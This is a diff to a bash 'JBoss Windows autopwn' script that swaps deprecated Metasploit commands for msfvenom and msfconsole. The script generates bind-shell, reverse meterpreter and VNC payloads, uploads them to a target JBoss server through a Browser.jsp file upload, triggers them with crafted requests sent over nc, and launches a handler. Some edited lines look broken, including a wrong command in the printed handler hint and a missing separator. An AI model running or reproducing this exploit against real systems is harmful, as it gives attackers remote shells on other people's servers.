@@ -17,6 +17,9 @@
 #    You should have received a copy of the GNU General Public License
 #    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
+
+# Updated to use msfconsole and msfvenom by Darkerego, as msfcli and msfpayload are deprecated
+
 if [ -z $1 ]
 then
 printf "[!] JBoss Windows autopwn\n[!] Usage: $0 server port\n"
@@ -55,7 +58,8 @@ if [ $shell == "bind" ]
 then
 printf "[x] On which port would you like your bindshell to listen? "
 read port
-framework3/msfpayload windows/shell_bind_tcp LPORT=$port X >payload.exe 
+#msfcli is depracted
+msfvenom -p windows/shell_bind_tcp LPORT=$port X >payload.exe 
 printf "[x] Uploading bindshell payload..\n"
 curl -F "dir=c:\\" -F "sort=1" -F "name=MyFile" -F "filename=@payload.exe" -F "Submit=Upload" http://$1:$2/browserwin/browser/Browser.jsp 1>/dev/null 2>/dev/null
 rm -rf payload.exe
@@ -73,7 +77,8 @@ printf "[x] Now executing bind shell...\n"
 sed "s/hostx/$1/g" execute/req1.win | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed -e "s/dir/c:\\\\payload.exe/g" | sed -e "s/46/60/g" | nc $1 $2 1>/dev/null 2>/dev/null  
 printf "[x] Executed bindshell!\n"
 printf "[x] Reverting to metasploit....\n"
-framework3/msfcli exploit/multi/handler PAYLOAD=windows/shell_bind_tcp LPORT=$port RHOST=$1 E 
+# msfconsole takes over for msfcli
+msfconsole -q -x "use exploit/multi/handler;set payload windows/shell_bind_tcp; set LPORT $port set RHOST $1 E"
 fi
 fi
 
@@ -82,7 +87,8 @@ then
 myip=`ifconfig -a | grep -i "inet" | cut -d: -f2 | awk '{print $1}' | head -n1`
 printf "[x] On which port would you like to accept your reverse shell? "
 read port
-framework3/msfpayload windows/meterpreter/reverse_tcp LHOST=$myip LPORT=$port X >payload.exe
+# msfvenom takes over for msfpayload 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$myip LPORT=$port X >payload.exe
 printf "[x] Uploading reverseshell payload..\n"
 curl -F "dir=c:\\" -F "sort=1" -F "name=MyFile" -F "filename=@payload.exe" -F "Submit=Upload" http://$1:$2/browserwin/browser/Browser.jsp 1>/dev/null 2>/dev/null
 rm -rf payload.exe
@@ -97,7 +103,7 @@ printf "[!] Reverse shell failed\n"
 else
 printf "[x] Reverse shell uploaded: $J\n"
 printf "[x] You now have 20 seconds to launch metasploit before I send a reverse shell back.. ctrl-z, bg then type:\n"
-printf "framework3/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$myip LPORT=$port E\n"
+printf "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$myip LPORT=$port X >payload.exe\n"
 sleep 20
 printf "[x] Now executing reverse shell...\n"
 sed "s/hostx/$1/g" execute/req1.win | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed -e "s/dir/c:\\\\payload.exe/g" | sed -e "s/46/60/g" | nc $1 $2 1>/dev/null 2>/dev/null
@@ -111,7 +117,7 @@ if [ $shell == "vnc" ]
 then
 printf "[x] On which port would you like your  vnc shell to listen? "
 read port
-framework3/msfpayload windows/vncinject/bind_tcp LPORT=$port X >payload.exe
+msfvenom -p windows/vncinject/bind_tcp LPORT=$port X >payload.exe
 printf "[x] Uploading vnc  shell payload..\n"
 curl -F "dir=c:\\" -F "sort=1" -F "name=MyFile" -F "filename=@payload.exe" -F "Submit=Upload" http://$1:$2/browserwin/browser/Browser.jsp 1>/dev/null 2>/dev/null
 rm -rf payload.exe
@@ -129,7 +135,8 @@ printf "[x] Now executing vnc  shell...\n"
 sed "s/hostx/$1/g" execute/req1.win | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed -e "s/dir/c:\\\\payload.exe/g" | sed -e "s/46/60/g" | nc $1 $2 1>/dev/null 2>/dev/null
 printf "[x] Executed  vnc shell!\n"
 printf "[x] Reverting to metasploit....\n"
-framework3/msfcli exploit/multi/handler PAYLOAD=windows/vncinject/bind_tcp LPORT=$port RHOST=$1 DisableCourtesyShell=TRUE E
+# msfconsole takes over msfcli
+msfconsole -q -x "use exploit/multi/handler;set PAYLOAD=windows/vncinject/bind_tcp;set LPORT $port;set RHOST $1;set DisableCourtesyShell=TRUE E"
 fi
 fi
 
